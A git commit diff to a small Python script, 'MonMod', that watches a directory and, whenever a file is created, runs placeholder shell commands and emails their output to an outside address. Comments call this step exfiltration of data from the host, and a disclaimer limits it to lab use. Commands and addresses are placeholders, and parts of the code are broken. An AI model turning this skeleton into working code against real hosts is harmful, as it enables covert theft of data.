728c426e8c95a1797a43bce689c23c0222db6fa4
James Daniel <james.j.daniel@outlook.com>
2016-11-14 00:25:30 -0600

    Refactor variable names; add explanations

--- src/mon_mod.py
+++ src/mon_mod.py
@@ -1,5 +1,8 @@
-# Monitor modifications to FS and email logs for diagnosis.
-# For legal purposes only! Originally created for a laboratory environment.
+# TITLE: MonMod
+# AUTHOR: James Daniel (james-daniel)
+# ATTN: Framework to monitor modifications to FS and email logs for diagnosis.
+# ATTN: Replace values of constants with corresponding values.
+# ATTN: For legal purposes only! Intended for a laboratory environment.
 
 try:
     import smtplib
@@ -11,43 +14,44 @@ try:
 except ImportError:
     print("Caught ImportError")
 
-class jd_fs_evt_handler(FileSystemEventHandler):
+class evt_hander(FileSystemEventHandler):
     def __init__(self, observer, fileName):
         self.observer = observer
         self.filename = fileName
     def on_created(self, event):
-        p = return_pass()
-        sendMail(p)
+        SENDER_PASSWORD = getpass.getpass()
+        sendMail(SENDER_PASSWORD)
 
 def pollSys():
     path = '<PATH>'
+    # Instantiate observer and event handler objects
     obs = Observer()
-    fs_evt_handler = jd_fs_evt_handler(obs, path)
+    fs_evt_handler = evt_hander(obs, path)
+    # Set scope of monitoring to path.
     obs.schedule(fs_evt_handler, path, recursive=True)
+    # Start observer and wait until thread fully terminates.
     obs.start()
     obs.join()
 
-def return_pass():
-    return getpass.getpass()
-
 def sendMail(sender_password):
-    receiver_email = '<EMAIL>'
-    sender_email = '<EMAIL2>'
-    smtp_srv = smtplib.SMTP("<SMTP_SERVER_FQDN>", 587)
-    smtp_srv.ehlo()
-    smtp_srv.starttls()
-    smtp_srv.ehlo()
-    smtp_srv.login(sender_email,sender_password)
+    # Connect to SMTP server.
+    RECEIVER_EMAIL = '<EMAIL>'
+    SENDER_EMAIL = '<EMAIL2>'
+    SMTP_SRV = smtplib.SMTP("<SMTP_SERVER_FQDN>", 587)
+    SMTP_SRV.ehlo()
+    SMTP_SRV.starttls()
+    SMTP_SRV.ehlo()
+    SMTP_SRV.login(SENDER_EMAIL,sender_password)
 
-    # Exfiltrate files
-    p = subprocess.Popen(['<BASH>'])
-    p2 = subprocess.Popen(['<BASH>'])
-    p3 = subprocess.Popen(['<BASH>'])
-    output = p.stdout.read()
-    output2 = p2.stdout.read()
-    output3 = p3.stdout.read()
-    header = 'To: ' + receiver_email + '\n' + 'From: ' + sender_email + '\n'
+    # Exfiltrate data from host
+    stdout1 = subprocess.Popen(['<BASH>'])
+    stdout2 = subprocess.Popen(['<BASH>'])
+    stdout3 = subprocess.Popen(['<BASH>'])
+    output = stdout1.stdout.read()
+    output2 = stdout2.stdout.read()
+    output3 = stdout3.stdout.read()
+    header = 'To: ' + RECEIVER_EMAIL + '\n' + 'From: ' + SENDER_EMAIL + '\n'
     + 'Subject: <SUBJECT>\n'
     message = header + '\n ' + output + '\n\n' + output2 + '\n\n' + output3
-    smtp_srv.sendmail(sender_email, receiver_email, message)
-    smtp_srv.close()
+    SMTP_SRV.sendmail(SENDER_EMAIL, RECEIVER_EMAIL, message)
+    SMTP_SRV.close()
